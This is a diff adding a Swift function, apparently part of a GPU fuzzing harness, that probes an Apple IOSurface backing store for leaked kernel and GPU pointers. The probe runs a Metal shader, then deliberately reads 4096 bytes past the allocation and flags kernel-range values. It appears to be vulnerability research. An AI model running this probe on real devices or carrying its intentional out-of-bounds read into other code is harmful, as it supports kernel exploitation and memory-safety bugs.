@@ -1684,3 +1684,123 @@ func runMismatchTest(log: FuzzLog) {
     else if tex == nil { step("nil — no crash, bounds-checked silently") }
     else { step("*** OK — NO BOUNDS CHECK — OOB confirmed ***") }
 }
+
+// IOSurface Backing Store Leak
+// Scans the IOSurface shared-memory allocation for kernel/GPU VA-range values.
+// IOSurface maps its backing store into user space — we scan it after a GPU pass
+// to catch any kernel pointers or GPU VAs that the firmware wrote in.
+// Also scans the tail bytes (after pixel data) for dirty allocator residue.
+func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+
+        guard let device = MTLCreateSystemDefaultDevice(),
+              let queue  = device.makeCommandQueue() else {
+            step("device nil"); completion(); return
+        }
+
+        // 256×4 bgra8 — pixel data = 4096 bytes, fills exactly one page.
+        // Tail bytes after pixel data (if allocationSize > 4096) = allocator residue.
+        let props: [IOSurfacePropertyKey: Any] = [
+            .width: 256, .height: 4,
+            .bytesPerElement: 4, .bytesPerRow: 1024,
+            .pixelFormat: kCVPixelFormatType_32BGRA
+        ]
+        guard let surface = IOSurface(properties: props) else {
+            step("IOSurface create failed"); completion(); return
+        }
+        let allocSize = surface.allocationSize
+        let globalID  = surface.globalID
+        let baseAddr  = surface.baseAddress
+        step("IOSurface id=\(globalID) base=0x\(String(UInt(bitPattern: baseAddr), radix: 16)) alloc=\(allocSize)")
+
+        // Lock — forces kernel to write lock state into backing store
+        var seed: UInt32 = 0
+        surface.lock(options: [], seed: &seed)
+        step("locked seed=\(seed)")
+
+        // IOSurface-backed MTLTexture — GPU reads/writes go through IOSurface backing mem
+        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .bgra8Unorm,
+                                                           width: 256, height: 4, mipmapped: false)
+        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
+        guard let tex = device.makeTexture(descriptor: td, iosurface: surface, plane: 0) else {
+            step("tex nil"); surface.unlock(options: [], seed: nil); completion(); return
+        }
+
+        // Shader: write a known sentinel (0xABCD) so we can distinguish pixel data from pointers
+        let src = """
+        #include <metal_stdlib>
+        using namespace metal;
+        kernel void probe(texture2d<uint,access::read_write> t [[texture(0)]],
+                          uint2 g [[thread_position_in_grid]]) {
+            t.write(uint4(0xAB, 0xCD, 0xEF, 0x42), g);
+        }
+        """
+        do {
+            let opt = MTLCompileOptions()
+            let lib = try device.makeLibrary(source: src, options: opt)
+            guard let fn = lib.makeFunction(name: "probe") else {
+                step("fn nil"); surface.unlock(options: [], seed: nil); completion(); return
+            }
+            let pso = try device.makeComputePipelineState(function: fn)
+            let tdU = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Uint,
+                                                                width: 256, height: 4, mipmapped: false)
+            tdU.storageMode = .shared; tdU.usage = [.shaderRead, .shaderWrite]
+            guard let texU = device.makeTexture(descriptor: tdU, iosurface: surface, plane: 0),
+                  let cmd  = queue.makeCommandBuffer(),
+                  let enc  = cmd.makeComputeCommandEncoder() else {
+                step("texU/cmd nil"); surface.unlock(options: [], seed: nil); completion(); return
+            }
+            enc.setComputePipelineState(pso)
+            enc.setTexture(texU, index: 0)
+            enc.dispatchThreads(MTLSize(width: 256, height: 4, depth: 1),
+                                threadsPerThreadgroup: MTLSize(width: 32, height: 1, depth: 1))
+            enc.endEncoding()
+            cmd.commit()
+            cmd.waitUntilCompleted()
+        } catch {
+            step("GPU err: \(error)"); surface.unlock(options: [], seed: nil); completion(); return
+        }
+
+        surface.unlock(options: [], seed: nil)
+        step("GPU done, unlocked — scanning \(allocSize + 4096) bytes from baseAddress")
+
+        let raw     = baseAddr.assumingMemoryBound(to: UInt8.self)
+        let scanLen = allocSize + 4096
+        var found   = 0
+        for qw in 0..<(scanLen / 8) {
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(raw[qw*8 + b]) << (b*8) }
+            guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
+
+            let isKern = val >= 0xFFFFFE0000000000
+            let isGPU  = val >= 0x100000000 && !isKern
+            // Skip obvious pixel repeats (all same byte pattern in each byte)
+            let b0 = val & 0xFF
+            let allSame = (val == b0 &* 0x0101010101010101)
+            guard (isKern || isGPU) && !allSame else { continue }
+
+            let tag = isKern ? " *** KERNEL PTR" : " (gpu va)"
+            step("  ios[+0x\(String(qw*8, radix: 16))] = 0x\(String(val, radix: 16))\(tag)")
+            found += 1
+            if found >= 80 { step("  ...truncated at 80"); break }
+        }
+
+        if found == 0 {
+            step("  no VA-range values — scanning raw non-zero qwords (first 20):")
+            var raw2found = 0
+            for qw in 0..<(scanLen / 8) {
+                var val: UInt64 = 0
+                for b in 0..<8 { val |= UInt64(raw[qw*8 + b]) << (b*8) }
+                guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
+                step("  ios[+0x\(String(qw*8, radix: 16))] = 0x\(String(val, radix: 16))")
+                raw2found += 1
+                if raw2found >= 20 { break }
+            }
+            if raw2found == 0 { step("  truly all zero") }
+        }
+
+        step("── IOSurface Leak complete ─────────────────")
+        completion()
+    }
+}
